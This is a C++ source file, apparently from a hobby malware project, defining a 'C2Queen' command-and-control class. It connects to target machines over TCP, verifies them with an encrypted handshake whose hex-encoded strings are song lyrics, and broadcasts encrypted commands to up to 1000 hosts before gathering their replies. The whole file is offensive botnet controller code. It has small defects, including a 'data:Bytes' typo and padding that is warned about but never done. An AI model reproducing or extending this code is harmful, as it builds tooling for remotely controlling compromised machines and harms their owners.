#include "../net/conn.h"
#include "../crypto/ciphers/vox.h"

namespace queen {

	data::Bytes defaultCall = {
		0x4B, 0x69, 0x6E, 0x67, 0x73, 0x6C, 0x61, 0x79, 
		0x65, 0x72, 0x2C, 0x20, 0x64, 0x65, 0x73, 0x74, 
		0x72, 0x6F, 0x79, 0x69, 0x6E, 0x67, 0x20, 0x63,
		0x61, 0x73, 0x74, 0x6C, 0x65, 0x73, 0x20, 0x69,
		0x6E, 0x20, 0x74, 0x68, 0x65, 0x20, 0x73, 0x6B,
		0x79, 0x21, 0x20, 0x4B, 0x69, 0x6E, 0x67, 0x73,
		0x6C, 0x61, 0x79, 0x65, 0x72, 0x2C, 0x20, 0x49,
		0x27, 0x64, 0x20, 0x73, 0x61, 0x63, 0x72, 0x69,
		0x66, 0x69, 0x63, 0x65, 0x20, 0x69, 0x74, 0x20, 
		0x61, 0x6C, 0x6C, 0x20, 0x74, 0x6F, 0x20, 0x66,
		0x69, 0x6E, 0x64, 0x20, 0x79, 0x6F, 0x75, 0x2C, 
		0x20, 0x6E, 0x65, 0x76, 0x65, 0x72, 0x20, 0x68,
		0x61, 0x76, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x62,
		0x61, 0x74, 0x74, 0x6C, 0x65, 0x20, 0x61, 0x6C,
		0x6F, 0x6E, 0x65, 0x21, 0x20, 0x28, 0x4F, 0x48,
		0x20, 0x59, 0x45, 0x41, 0x48, 0x21, 0x29, 0x20
	};

	data::Bytes defaultResponse = {
		0x4C, 0x69, 0x66, 0x65, 0x20, 0x69, 0x73, 0x20,
		0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x65,
		0x64, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x27, 0x72,
		0x65, 0x20, 0x6D, 0x6F, 0x64, 0x69, 0x66, 0x69,
		0x65, 0x64, 0x2C, 0x20, 0x6C, 0x69, 0x6B, 0x65,
		0x20, 0x61, 0x20, 0x76, 0x69, 0x72, 0x75, 0x73,
		0x20, 0x69, 0x6E, 0x20, 0x61, 0x20, 0x6C, 0x75, 
		0x6C, 0x6C, 0x61, 0x62, 0x79, 0x21, 0x20, 0x41,
		0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x69, 0x61,
		0x6C, 0x20, 0x74, 0x69, 0x6C, 0x6C, 0x20, 0x74,
		0x68, 0x65, 0x20, 0x64, 0x61, 0x79, 0x20, 0x79,
		0x6F, 0x75, 0x20, 0x64, 0x69, 0x65, 0x2C, 0x20,
		0x73, 0x69, 0x6C, 0x6C, 0x79, 0x20, 0x70, 0x72,
		0x6F, 0x67, 0x72, 0x61, 0x6D, 0x2C, 0x20, 0x79,
		0x6F, 0x75, 0x27, 0x72, 0x65, 0x20, 0x63, 0x6F,
		0x72, 0x72, 0x75, 0x70, 0x74, 0x65, 0x64, 0x21
	};

	class C2Queen {

		private:

			key::Key k;
			vox::VOX cipher;
			data::Bytes c;
			data::Bytes r;

			sda::SDA<conn::TCPConnection> connections;
			int nextConnectionIndex = 0;

		public:

			C2Queen(key::Key encryptionKey, data::Bytes call = defaultCall, data::Bytes response = defaultResponse, int n = 1000) {
				k = encryptionKey;
				c = call;
				r = response;
				if (c.getLength() != 128) {
					notif::warning("automatically padding call to be 128 bytes");
				}
				if (r.getLength() != 128) {
					notif::warning("automatically padding response to be 128 bytes");
				}
				connections = sda::SDA<conn::TCPConnection>(n);
			}

			int getConnectionCount() { return nextConnectionIndex; }

			void establishConnection(string ip, int port) {
				connections.set(nextConnectionIndex, conn::TCPConnection(ip, port));
				connections[nextConnectionIndex].establish();
				data:Bytes callCiphertext = cipher.encrypt(c, k);
				connections[nextConnectionIndex].transmit(callCiphertext);
				data::Bytes response = connections[nextConnectionIndex].receive();
				bool correct = false;
				if (response.getLength() == 256) {
					if (cipher.decrypt(response, k) == r) {
						correct = true;
					}
				}
				if (!correct) {
					notif::security("target machine did not respond correctly", CAUTION);
				}
			}

			void terminateConnections() {
				for (int i = 0; i < getConnectionCount(); i++) {
					connections.get(i).terminate();
				}
				nextConnectionIndex = 0;
			}

			data::Bytes strip(data::Bytes x) {
				int n = 0;
				for (int i = 0; x.get(i) != 0; i++) { n++; }
				return x.subbytes(0, n);
			}

			sda::SDA<data::Bytes> transmitCommand(string cmd) {
				data::Bytes cmdBytes(cmd);
				for (int i = 0; i < getConnectionCount(); i++) {
					connections[i].transmit(cipher.encrypt(cmdBytes, k));
				}
				sda::SDA<data::Bytes> results(getConnectionCount());
				for (int i = 0; i < getConnectionCount(); i++) {
					results.set(i, strip(cipher.decrypt(connections[i].receive(), k)));
				}
				return results;
			}

	};

};
